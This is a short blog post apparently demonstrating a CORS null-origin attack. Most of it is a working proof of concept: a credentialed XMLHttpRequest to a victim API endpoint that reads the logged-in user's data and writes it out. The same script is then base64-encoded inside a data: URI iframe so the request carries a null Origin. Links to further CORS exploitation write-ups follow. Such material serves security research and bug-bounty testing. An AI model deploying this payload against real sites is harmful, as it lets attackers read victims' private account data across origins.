---
layout: single
title:  "Abusing CORS via null origin"
---

![](http://okqza840l.bkt.clouddn.com/20180704165454.png)
![](http://okqza840l.bkt.clouddn.com/20180704165532.png)

POC:
```
<script>
    var url = "https://www.victim.com/api/getuser";
    var req = new XMLHttpRequest();
    req.open('get',url,true);
    req.setRequestHeader("Accept", "application/json");
    req.withCredentials = true;
    req.send();
    req.onreadystatechange= function(){
    if(req.readyState == req.DONE) {
        document.write(this.responseText)
    }}
 </script>
```
This code was converted to the equivalent Base64 string.
```
<iframe width=100% height=100% src="data:text/html;base64,PHNjcmlwdD4gdmFyIHVybCA9ICJodHRwczovL3d3dy52aWN0aW0uY29tL2FwaS9nZXR1c2VyIjsgIHZhciByZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtyZXEub3BlbignZ2V0Jyx1cmwsdHJ1ZSk7cmVxLnNldFJlcXVlc3RIZWFkZXIoIkFjY2VwdCIsICJhcHBsaWNhdGlvbi9qc29uIik7cmVxLndpdGhDcmVkZW50aWFscyA9IHRydWU7cmVxLnNlbmQoKTtyZXEub25yZWFkeXN0YXRlY2hhbmdlPSBmdW5jdGlvbigpe2lmKHJlcS5yZWFkeVN0YXRlID09IHJlcS5ET05FKSB7ZG9jdW1lbnQud3JpdGUodGhpcy5yZXNwb25zZVRleHQpfSB9PC9zY3JpcHQ+">
```
Further reading:
- [Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [Exploiting Misconfigured CORS (Cross Origin Resource Sharing)](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
- [Exploiting Misconfigured CORS via Wildcard Subdomains](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-via-wildcard-subdomains)
- [CORS misconfigurations on a large scale](https://web-in-security.blogspot.com/2017/07/cors-misconfigurations-on-large-scale.html)
- [CORS Exploitation: Data exfiltration when allowed origin is set to NULL](https://yassineaboukir.com/blog/cors-exploitation-data-exfiltration-when-allowed-origin-is-set-to-null/)
- [CORS Misconfigurations Explained](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
- [Advanced CORS Exploitation Techniques](https://www.sxcurity.pro/advanced-cors-techniques/)
